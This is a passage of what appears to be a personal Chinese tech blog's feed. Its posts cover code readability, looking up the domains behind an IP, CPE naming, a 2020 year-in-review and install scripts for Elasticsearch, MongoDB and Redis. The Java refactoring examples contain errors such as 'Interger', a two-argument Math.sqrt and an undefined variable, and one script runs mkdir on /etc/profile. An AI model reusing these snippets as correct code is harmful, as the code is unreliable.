title="十、抽取函数"></a>十、抽取函数</h1><p>工程学就是把大问题拆分成小问题再把这些问题的解决方案放回一起。</p><p>首先应该明确一个函数的高层次目标，然后对于不是直接为了这个目标工作的代码，抽取出来放到独立的函数中。</p><p>介绍性的代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">findClostElement</span><span class="params">(<span class="keyword">int</span>[] arr)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> clostIdx;</span><br><span class="line">    <span class="keyword">int</span> clostDist = Interger.MAX_VALUE;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line">        <span class="keyword">int</span> x = ...;</span><br><span class="line">        <span class="keyword">int</span> y = ...;</span><br><span class="line">        <span class="keyword">int</span> z = ...;</span><br><span class="line">        <span class="keyword">int</span> value = x * y * z;</span><br><span class="line">        <span class="keyword">int</span> dist = Math.sqrt(Math.pow(value, <span class="number">2</span>), Math.pow(arr[i], <span class="number">2</span>));</span><br><span class="line">        <span class="keyword">if</span> (dist &lt; clostDist) &#123;</span><br><span class="line">            clostIdx = i;</span><br><span class="line">            clostDist = value;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> clostIdx;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以上代码中循环部分主要计算距离，这部分不属于代码高层次目标，高层次目标是寻找最小距离的值，因此可以把这部分代替提取到独立的函数中。这样做也带来一个额外的好处有：可以单独进行测试、可以快速找到程序错误并修改。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">findClostElement</span><span class="params">(<span class="keyword">int</span>[] arr)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> clostIdx;</span><br><span class="line">    <span class="keyword">int</span> clostDist = Interger.MAX_VALUE;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line">        <span class="keyword">int</span> dist = computDist(arr, i);</span><br><span class="line">        <span class="keyword">if</span> (dist &lt; clostDist) &#123;</span><br><span class="line">            clostIdx = i;</span><br><span class="line">            clostDist = value;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> clostIdx;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>并不是函数抽取的越多越好，如果抽取过多，在阅读代码的时候可能需要不断跳来跳去。只有在当前函数不需要去了解某一块代码细节而能够表达其内容时，把这块代码抽取成子函数才是好的。</p><p>函数抽取也用于减小代码的冗余。</p><h1 id="十一、一次只做一件事"><a href="#十一、一次只做一件事" class="headerlink" title="十一、一次只做一件事"></a>十一、一次只做一件事</h1><p>只做一件事的代码很容易让人知道其要做的事；</p><p>基本流程：列出代码所做的所有任务；把每个任务拆分到不同的函数，或者不同的段落。</p><h1 id="十二、用自然语言表述代码"><a href="#十二、用自然语言表述代码" class="headerlink" title="十二、用自然语言表述代码"></a>十二、用自然语言表述代码</h1><p>先用自然语言书写代码逻辑，也就是伪代码，然后再写代码，这样代码逻辑会更清晰。</p><h1 id="十三、减少代码量"><a href="#十三、减少代码量" class="headerlink" title="十三、减少代码量"></a>十三、减少代码量</h1><p>不要过度设计，编码过程会有很多变化，过度设计的内容到最后往往是无用的。</p><p>多用标准库实现。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;一、可读性的重要性&quot;&gt;&lt;a href=&quot;#一、可读性的重要性&quot; class=&quot;headerlink&quot; title=&quot;一、可读性的重要性&quot;&gt;&lt;/a&gt;一、可读性的重要性&lt;/h1&gt;&lt;p&gt;编程有很大一部分时间是在阅读代码，不仅要阅读自己的代码，而且要阅读别人的代码。因此，</summary>
      
    
    
    
    <category term="代码可读性规范" scheme="https://lennon.work/categories/%E4%BB%A3%E7%A0%81%E5%8F%AF%E8%AF%BB%E6%80%A7%E8%A7%84%E8%8C%83/"/>
    
    
    <category term="code可读性" scheme="https://lennon.work/tags/code%E5%8F%AF%E8%AF%BB%E6%80%A7/"/>
    
    <category term="规范" scheme="https://lennon.work/tags/%E8%A7%84%E8%8C%83/"/>
    
  </entry>
  
  <entry>
    <title>IP反查域名（一）</title>
    <link href="https://lennon.work/2021/04/11/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/search_domain_by_ip/"/>
    <id>https://lennon.work/2021/04/11/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/search_domain_by_ip/</id>
    <published>2021-04-11T14:58:54.406Z</published>
    <updated>2021-01-04T13:13:13.687Z</updated>
    
    <content type="html"><![CDATA[<h3 id="域名系统简介"><a href="#域名系统简介" class="headerlink" title="域名系统简介"></a>域名系统简介</h3><h4 id="域名系统"><a href="#域名系统" class="headerlink" title="域名系统"></a>域名系统</h4><p>的英文名称是Domain Name System，缩写是DNS，他是互联网的一项服务，是一种将域名和IP地址相互关联的数据库。让用户方便、快捷使用互联网。</p><hr><h4 id="为啥要引入？"><a href="#为啥要引入？" class="headerlink" title="为啥要引入？"></a>为啥要引入？</h4><ul><li>现实生活中，由于ip数量巨大，记忆困难，输入也极不方便，直接使用ip地址直接访问某一个主机会特别麻烦</li><li>主机ip地址经常更换，更换后需要更新原ip地址库</li></ul><p>为解决以上不方便，特地引入域名这一概念，域名既是给ip地址起别名，用户只需要记录域名，让专门的服务去寻找ip地址</p><hr><h4 id="域名解析"><a href="#域名解析" class="headerlink" title="域名解析"></a>域名解析</h4><p>将域名解析成IP地址的过程即为域名解析，这一工作由DNS服务器完成</p><p><img src="/img/search_domain_by_ip/dns_server.png" alt="dns_server"></p><p>​    </p><p><img src="/img/search_domain_by_ip/pingbaidu.png" alt="pingbaidu"></p><p>通过向dns服务器发送query请求即可查询到想要查询的域名的ip地址</p><hr><h3 id="IP反查域名"><a href="#IP反查域名" class="headerlink" title="IP反查域名"></a>IP反查域名</h3><p>顾名思义 在知道ip地址的情况下，需要查询ip上绑定的域名信息。</p><p><strong>同一个ip可以在不同时间绑定多个域名，但是同一时间只能绑定一个域名</strong></p><p>因此搜集到的域名是具有时效的</p><hr><h4 id="查询方式"><a href="#查询方式" class="headerlink" title="查询方式"></a>查询方式</h4><h5 id="特有网站查询："><a href="#特有网站查询：" class="headerlink" title="特有网站查询："></a>特有网站查询：</h5><p>ip历史解析记录，由<a href="https://ip138.com/">ip138.com</a>维护的历史ip解析记录查询</p><p><a href="https://site.ip138.com/">https://site.ip138.com/</a>（推荐）</p><p><img src="/img/search_domain_by_ip/search.png" alt="search"></p><p><img src="/img/search_domain_by_ip/search2.png" alt="search2"></p><p><a href="https://www.webscan.cc/">https://www.webscan.cc/</a></p><p><a href="https://dns.aizhan.com/">https://dns.aizhan.com/</a></p><hr><h5 id="证书搜集"><a href="#证书搜集" class="headerlink" title="证书搜集"></a>证书搜集</h5><p>如果服务器开启的Web服务端口有配备SSL证书，可以在证书中查看到域名信息。</p><p><img src="/img/search_domain_by_ip/cert.png" alt="cert"></p><!--如果站点使用自签证书，或者证书无效等是看不到域名信息的--><hr><h5 id="网站信息收集"><a href="#网站信息收集" class="headerlink" title="网站信息收集"></a>网站信息收集</h5><p>访问站点开放http、https服务，从站点返回信息（响应头、响应体）中可能能获取到域名信息</p><p>下一节将通过代码实现通过证书信息获取到域名信息，敬请期待</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;域名系统简介&quot;&gt;&lt;a href=&quot;#域名系统简介&quot; class=&quot;headerlink&quot; title=&quot;域名系统简介&quot;&gt;&lt;/a&gt;域名系统简介&lt;/h3&gt;&lt;h4 id=&quot;域名系统&quot;&gt;&lt;a href=&quot;#域名系统&quot; class=&quot;headerlink&quot; title=&quot;域</summary>
      
    
    
    
    <category term="网络安全" scheme="https://lennon.work/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="dns" scheme="https://lennon.work/tags/dns/"/>
    
  </entry>
  
  <entry>
    <title>Common Platform Enumeration(CPE)</title>
    <link href="https://lennon.work/2021/04/11/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/cpe/"/>
    <id>https://lennon.work/2021/04/11/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/cpe/</id>
    <published>2021-04-11T14:58:54.405Z</published>
    <updated>2021-01-24T12:47:40.318Z</updated>
    
    <content type="html"><![CDATA[<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><blockquote><p>CPE全称是Common Platform Enumeration，意思是通用平台枚举项。它是NMAP对识别出来的软件、操作系统和硬件的一种命名方式。</p></blockquote><h3 id="格式"><a href="#格式" class="headerlink" title="格式"></a>格式</h3><blockquote><p>cpe:/<part>:<vendor>:<product>:<version>:<update>:<edition>:<language></p></blockquote><ol><li><p>part表示目标类<br>a：应用程序<br>h：硬件平台<br>o：操作系统</p></li><li><p>vendor表示向量类型；</p></li><li><p>product表示产品名称</p></li><li><p>version表示版本号；</p></li><li><p>update表示更新包；</p></li><li><p>edition表示版本；</p></li><li><p>language表示语言项。</p></li></ol><p><img src="/img/CPE/cpe.jpg" alt="cpe"></p><h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><p>CPE:/o:microsoft:windows_xp:::x86:,CPE:/o:microsoft:windows_vista:::x86:</p><p>part : o 操作系统</p><p>vendor：microsoft</p><p>product ：windows_xp</p><p>version：</p><p>update：</p><p>edition：x86</p><p>language：</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;CPE全称是Common Platform Enumeration，意思是通用平台枚举项。它是NMAP对识别出来的</summary>
      
    
    
    
    <category term="网络安全" scheme="https://lennon.work/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="基础知识" scheme="https://lennon.work/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
  </entry>
  
  <entry>
    <title>Hello 2021!</title>
    <link href="https://lennon.work/2021/04/11/%E6%9D%82%E8%B0%88/Hello%202021!/"/>
    <id>https://lennon.work/2021/04/11/%E6%9D%82%E8%B0%88/Hello%202021!/</id>
    <published>2021-04-11T14:58:54.402Z</published>
    <updated>2021-01-02T14:46:10.420Z</updated>
    
    <content type="html"><![CDATA[<h4 id="置顶"><a href="#置顶" class="headerlink" title="置顶"></a>置顶</h4><p>很庆幸你能看到这篇博客</p><p>作为2020的幸存者，为逝者默哀</p><p><img src="/img/20210101/moai.jpg"></p><hr><h3 id="2020"><a href="#2020" class="headerlink" title="2020?"></a>2020?</h3><p>感觉超级快有木有</p><p>回顾疫情爆发时间已经是前年的九月份</p><p>已经过去了一年多</p><p>都说2020是多灾多难的一年</p><p>疫情 火灾 洪水 还有科比</p><p>都再我们身边发生</p><p>真是 太难了</p><p><img src="/img/20210101/tainanle.jpg" alt="tainanle"></p><hr><h4 id="1-3月份"><a href="#1-3月份" class="headerlink" title="1-3月份"></a>1-3月份</h4><p>疫情肆虐 武汉封城</p><p>今年不回家了</p><p>不给国家添乱</p><p> 一个人留在南京</p><p>也不算一个人</p><p>还有我的明明陪我</p><p>熬过了每天的新增</p><p>熬过了周围小区偶尔爆出的病例</p><p>熬过了每天的孤独</p><p>做饭成为了最大的乐趣</p><p>厨艺倒是有了些许的进步</p><p><img src="/img/20210101/woyaochuqu.gif" alt="woyaochuqu"></p><p><img src="/img/20210101/pingtu1.jpg" alt="pingtu1"></p><hr><h4 id="3-4月"><a href="#3-4月" class="headerlink" title="3-4月"></a>3-4月</h4><p>在家办公</p><p>事不多</p><p>得自己找事情做</p><p>打完卡继续睡？</p><p>睡醒起来迷迷糊糊回个消息</p><p>下午准点打卡下班</p><p>起锅造饭 </p><p>今天的晚餐我又有新点子啦</p><p> <img src="/img/20210101/woyaoshangban.jpg" alt="woyaoshangban"></p><hr><h4 id="5-6月"><a href="#5-6月" class="headerlink" title="5-6月"></a>5-6月</h4><p>洪水到哪里？</p><p> 四川重庆？ 湖南湖北？ 安徽江西？</p><p>总和同事讨论这些话题</p><p>乐此不疲</p><p>这段时间普遍自己带饭</p><p>红烧排骨 辣子鸡丁</p><p>不存在的</p><p>番茄炒鸡蛋是拿手</p><p>啥都吃 啥都能活</p><p><img src="/img/20210101/pingtu4.jpg" alt="pingtu4"></p><hr><h4 id="10月"><a href="#10月" class="headerlink" title="10月"></a>10月</h4><p>国庆终于有机会回家一趟</p><p>好友 亲朋 家人</p><p>辗转 重庆 成都 然后回家</p><p>everything is on control</p><p><img src="/img/20210101/pingtu2.jpg" alt="pingtu2"></p><hr><p><img src="/img/20210101/pingtu3.jpg" alt="pingtu3"></p><hr><p><img src="/img/20210101/pigntu5.jpg" alt="pigntu5"></p><hr><p>归程 大概受到某某人的印象</p><p>决定是时候脱单了</p><p>找一个愿意长期甚至一辈子的对象</p><p><strong>慕然回首</strong></p><p><strong>那人正在灯火阑珊处</strong></p><p><img src="/img/20210101/qianshou.jpg" alt="qianshou"></p><hr><h4 id="年末"><a href="#年末" class="headerlink" title="年末"></a>年末</h4><p>经过爱情洗礼了两个月</p><p>用一个“得偿所愿”形容</p><p>不禁感慨</p><p>我也值得甜甜的爱</p><p><img src="/img/20210101/kaixin.gif" alt="kaixin"><img src="/img/20210101/kaixin.gif" alt="kaixin"></p><hr><h3 id="2021"><a href="#2021" class="headerlink" title="2021"></a>2021</h3><p><em>辞2020，迎2021</em></p><p><em>新的开始 新的所遇</em></p><p><img src="/img/20210101/2020-2.png" alt="2020-2"></p><hr><p>又长了一岁</p><p>又多一分压力</p><p>钱包没见多</p><p>花呗只见涨</p><p><strong>财务自由</strong></p><p><strong>从还完花呗开始吧</strong></p><p>超前消费正毒害年轻的我</p><p>钱包守卫战正在打响</p><p><img src="/img/20210101/qianbao.jpg" alt="qianbao"><img src="/img/20210101/daji.jpg" alt="daji"></p><hr><p>我爱的人 </p><p>爱我的人 </p><p>都要健健康康 </p><p>幸福开心</p><hr><p>每天乐观开心 </p><p>积极向上 </p><p>早起（这个再说）</p><p><img src="/img/20210101/buxiangqichuang.jpg" alt="buxiangqichuang"></p><hr><p>八块腹肌不现实 </p><p>那就两块胸肌 </p><p>决定了[拳头]</p><p><img src="/img/20210101/fuji.jpg" alt="fuji"></p><hr><p>golang大神？</p><p>从渣渣开始</p><p><img src="/img/20210101/zhazha.jpg" alt="zhazha"></p><hr><p>涨 涨 涨 </p><p>你知道我想要什么</p><p><img src="/img/20210101/fanche.gif" alt="fanche"></p><hr><p>你居然翻到这里了</p><p>哈哈</p><p>祝 ： 元旦之际 节日安康</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;置顶&quot;&gt;&lt;a href=&quot;#置顶&quot; class=&quot;headerlink&quot; title=&quot;置顶&quot;&gt;&lt;/a&gt;置顶&lt;/h4&gt;&lt;p&gt;很庆幸你能看到这篇博客&lt;/p&gt;
&lt;p&gt;作为2020的幸存者，为逝者默哀&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/img/20210101/moa</summary>
      
    
    
    
    <category term="杂谈" scheme="https://lennon.work/categories/%E6%9D%82%E8%B0%88/"/>
    
    
    <category term="2021" scheme="https://lennon.work/tags/2021/"/>
    
  </entry>
  
  <entry>
    <title>常用工具包汇总一</title>
    <link href="https://lennon.work/2021/04/11/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7%E6%B1%87%E6%80%BB/"/>
    <id>https://lennon.work/2021/04/11/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7%E6%B1%87%E6%80%BB/</id>
    <published>2021-04-11T14:58:54.399Z</published>
    <updated>2021-01-25T11:59:20.279Z</updated>
    
    <content type="html"><![CDATA[<h1 id="常用工具"><a href="#常用工具" class="headerlink" title="常用工具"></a>常用工具</h1><hr><h3 id="git"><a href="#git" class="headerlink" title="git"></a>git</h3><p>神器 置顶</p><p>下载链接 <a href="https://git-scm.com/">https://git-scm.com/</a></p><hr><h3 id="typora"><a href="#typora" class="headerlink" title="typora"></a>typora</h3><p>下载链接 <a href="https://www.typora.io/">https://www.typora.io/</a></p><hr><h3 id="Elasticsearch"><a href="#Elasticsearch" class="headerlink" title="Elasticsearch"></a>Elasticsearch</h3><h4 id="elasticsearch"><a href="#elasticsearch" class="headerlink" title="elasticsearch"></a>elasticsearch</h4><p>官方下载链接 <a href="https://www.elastic.co/cn/downloads/elasticsearch">https://www.elastic.co/cn/downloads/elasticsearch</a></p><p>出于语言驱动原因，尽量使用低于最新版本一点的版本</p><p>jdk安装</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line">usr_local_dir=/usr/local</span><br><span class="line">java_dir=/usr/local/java </span><br><span class="line">etc_profile=/etc/profile</span><br><span class="line">if [ ! -d $usr_local_dir ]; then</span><br><span class="line">  mkdir $usr_local_dir</span><br><span class="line">fi</span><br><span class="line">if [ ! -d $java_dir ]; then</span><br><span class="line">  mkdir $java_dir</span><br><span class="line">fi</span><br><span class="line">if [ ! -d $etc_profile ]; then</span><br><span class="line">  mkdir $etc_profile</span><br><span class="line">fi</span><br><span class="line">echo &quot;---------安装java环境---------&quot;</span><br><span class="line">tar -zxf  jdk-8u181-linux-x64.tar.gz -C $java_dir</span><br><span class="line">echo &quot;export JAVA_HOME=$java_dir/jdk1.8.0_181&quot; &gt;&gt; $etc_profile</span><br><span class="line">echo &quot;export PATH=\$PATH:\$JAVA_HOME/bin&quot; &gt;&gt; $etc_profile</span><br><span class="line">ln -s $java_dir/jdk1.8.0_181/bin/java /usr/bin/java</span><br><span class="line">echo &quot;---------java环境安装成功---------&quot;</span><br></pre></td></tr></table></figure><p>elasticsearch安装</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">elk_dir=/home/elk</span><br><span class="line">es_node_name=node-1</span><br><span class="line">es_jvm=12g</span><br><span class="line"></span><br><span class="line">opt_dir=/home/opt</span><br><span class="line">if [ ! -d &quot;$opt_dir&quot; ]; then</span><br><span class="line">  mkdir &quot;$opt_dir&quot;</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">echo &quot;--------安装elasticsearch-------&quot;</span><br><span class="line">if [ ! -d &quot;$elk_dir&quot; ]; then</span><br><span class="line">  mkdir &quot;$elk_dir&quot;</span><br><span class="line">fi</span><br><span class="line">es_mkdir_cmd=&quot;mkdir $&#123;elk_dir&#125;&quot;</span><br><span class="line">es_config=&quot;$&#123;elk_dir&#125;/elasticsearch-7.9.1/config/&quot;</span><br><span class="line">tar -zxf elasticsearch-7.9.1-linux-x86_64.tar.gz -C $elk_dir</span><br><span class="line">adduser=&quot;adduser elkusr&quot;</span><br><span class="line">chownes=&quot;chown elkusr:elkusr -R $&#123;elk_dir&#125;/elasticsearch-7.9.1&quot;</span><br><span class="line"><span class="meta">$</span><span class="bash">adduser</span></span><br><span class="line"><span class="meta">$</span><span class="bash">chownes</span></span><br><span class="line"></span><br><span class="line">sed -i &quot;s/-Xms2g/-Xms$&#123;es_jvm&#125;/g&quot; $&#123;es_config&#125;jvm.options</span><br><span class="line">sed -i &quot;s/-Xmx2g/-Xmx$&#123;es_jvm&#125;/g&quot; $&#123;es_config&#125;jvm.options</span><br><span class="line">echo &quot;vm.max_map_count=655360&quot; &gt;&gt; /etc/sysctl.conf</span><br><span class="line">sysctl -p</span><br><span class="line"><span class="meta">#</span><span class="bash">该设置需要重启方可生效，解决max file descriptors [4096] <span class="keyword">for</span> elasticsearch process is too low的问题</span></span><br><span class="line">echo &quot;* soft nofile 65536&quot; &gt;&gt; /etc/security/limits.conf</span><br><span class="line">echo &quot;* hard nofile 131072&quot; &gt;&gt; /etc/security/limits.conf</span><br><span class="line">echo &quot;* soft nproc 2048&quot; &gt;&gt; /etc/security/limits.conf</span><br><span class="line">echo &quot;* hard nproc 4096&quot; &gt;&gt; /etc/security/limits.conf</span><br><span class="line"><span class="meta">#</span><span class="bash">解决max number of threads [1024] <span class="keyword">for</span> user [es] is too low, increase to at least [2048]</span></span><br><span class="line">thread_conf=$(find /etc/security/limits.d/*.conf | head -n 1)</span><br><span class="line">echo &quot; * soft nproc 4096&quot; &gt;&gt; $&#123;thread_conf&#125;</span><br><span class="line">echo &quot; * hard nproc 4096&quot; &gt;&gt; $&#123;thread_conf&#125;</span><br><span class="line">echo &quot;--------elasticsearch安装成功-------&quot;</span><br><span class="line">exit 0</span><br></pre></td></tr></table></figure><hr><h4 id="Cerebro"><a href="#Cerebro" class="headerlink" title="Cerebro"></a>Cerebro</h4><p>cerebro需要JDK1.8或者更新的版本予以支持，最简单的方式莫过于使用Docker镜像方式启动服务了。</p><p>安装</p><p>docker镜像安装</p><blockquote><p>docker pull lmenezes/cerebro:0.8.4</p><p>docker run –name cerebro -d -p 9100:9000  lmenezes/cerebro:0.8.4</p></blockquote><p>docker-compose安装</p><p>docker-compose.yml</p><blockquote><p>version: ‘2’<br>services:</p><p>  #cerebro service<br>  cerebro:<br>    image: lmenezes/cerebro:0.8.4<br>    ports:<br>      - “9100:9000”<br>        restart: “no”</p></blockquote><blockquote><p>docker-compose build cerebro<br>docker-compose up cerebro</p></blockquote><hr><h4 id="kibana"><a href="#kibana" class="headerlink" title="kibana"></a>kibana</h4><p>解压后进入 bin目录下</p><p>官方下载链接<a href="https://www.elastic.co/cn/downloads/kibana">https://www.elastic.co/cn/downloads/kibana</a></p><p>版本尽量与elasticsearch版本保持一致</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nohup sudo -u elkusr ./kibana &gt;/dev/null &amp;  #不能在root用户下，安全原因</span><br></pre></td></tr></table></figure><hr><h3 id="mongodb"><a href="#mongodb" class="headerlink" title="mongodb"></a>mongodb</h3><h4 id="mongodb-1"><a href="#mongodb-1" class="headerlink" title="mongodb"></a>mongodb</h4><p>官方下载链接 <a href="https://www.mongodb.com/try/download/community">https://www.mongodb.com/try/download/community</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">mongodb_dir=/home/mongo</span><br><span class="line"></span><br><span class="line">if [ ! -d &quot;$mongodb_dir&quot; ]; then</span><br><span class="line">  mkdir &quot;$mongodb_dir&quot;</span><br><span class="line">fi</span><br><span class="line"><span class="meta">#</span><span class="bash">进入压缩包目录，执行解压操作：</span></span><br><span class="line">tar -zxf mongodb-linux-x86_64-4.0.4.tgz -C /home/opt/mongodb</span><br><span class="line">cd /home/opt/mongodb/ </span><br><span class="line">mv -f mongodb-linux-x86_64-4.0.4/* .   #移动内容至mongodb</span><br><span class="line">mkdir db        #数据库存放目录</span><br><span class="line">mkdir logs       #日志存放目录</span><br><span class="line">touch logs/mongodb.log   #日志文件</span><br></pre></td></tr></table></figure><hr><h4 id="NoSQLBooster-for-MongoDB"><a href="#NoSQLBooster-for-MongoDB" class="headerlink" title="NoSQLBooster for MongoDB"></a>NoSQLBooster for MongoDB</h4><p><a href="https://nosqlbooster.com/downloads">https://nosqlbooster.com/downloads</a></p><hr><h3 id="redis"><a href="#redis" class="headerlink" title="redis"></a>redis</h3><h4 id="redis-1"><a href="#redis-1" class="headerlink" title="redis"></a>redis</h4><p>下载链接 <a href="https://github.com/redis/redis">https://github.com/redis/redis</a> </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">opt_dir=/home/</span><br><span class="line">if [ ! -d &quot;$opt_dir&quot; ]; then</span><br><span class="line">  mkdir &quot;$opt_dir&quot;</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">redis_dir=/home/redis</span><br><span class="line">if [ ! -d &quot;$redis_dir&quot; ]; then</span><br><span class="line">  mkdir &quot;$redis_dir&quot;</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">tar -zxf redis-5.0.2.tar.gz -C /home/opt/redis</span><br><span class="line">cd /home/opt/redis/redis-5.0.2</span><br><span class="line">rm -rf /softs/redis-5.0.2.tar.gz</span><br><span class="line"><span class="meta">#</span><span class="bash">执行编译操作：</span></span><br><span class="line">yum -y install gcc gcc-c++ kernel-devel</span><br><span class="line">make</span><br><span class="line"><span class="meta">#</span><span class="bash">安装：</span></span><br><span class="line">make PREFIX=/home/opt/redis install</span><br><span class="line">cp redis.conf /home/opt/redis/bin</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">修改配置：</span></span><br><span class="line"><span class="meta">#</span><span class="bash">vi /home/opt/redis/bin/redis.conf</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> redis以守护进程的方式运行</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> no表示不以守护进程的方式运行(会占用一个终端)</span>  </span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">daemonize yes</span></span><br><span class="line">sed -i  &#x27;s/daemonize no/daemonize yes/g&#x27; /home/opt/redis/bin/redis.conf</span><br><span class="line">cd /home/opt/redis/bin</span><br><span class="line">cp redis-cli /usr/bin/</span><br><span class="line">./redis-server redis.conf</span><br><span class="line">cd /</span><br><span class="line">exit 0</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><h4 id="Redis-DeskTop-Manager"><a href="#Redis-DeskTop-Manager" class="headerlink" title="Redis DeskTop Manager"></a>Redis DeskTop Manager</h4><p>下载链接 <a href="https://github.com/qishibo/AnotherRedisDesktopManager/releases">https://github.com/qishibo/AnotherRedisDesktopManager/releases</a></p><hr><h3 id="wareshark"><a href="#wareshark" class="headerlink" title="wareshark"></a>wareshark</h3><p>下载链接  <a href="https://www.wireshark.org/">https://www.wireshark.org/</a></p><hr><h3 id="postman"><a href="#postman" class="headerlink" title="postman"></a>postman</h3><p>下载链接 <a href="https://www.postman.com/downloads/">https://www.postman.com/downloads/</a></p><hr><h3 id="xshell"><a href="#xshell" class="headerlink" title="xshell"></a>xshell</h3><p>下载链接 <a href="https://xshell.en.softonic.com/">https://xshell.en.softonic.com/</a></p><hr><h3 id="JetBrains大礼包"><a href="#JetBrains大礼包" class="headerlink" title="JetBrains大礼包"></a>JetBrains大礼包</h3><p>goland <a href="https://www.jetbrains.com/go/">https://www.jetbrains.com/go/</a></p><p>pycharm <a 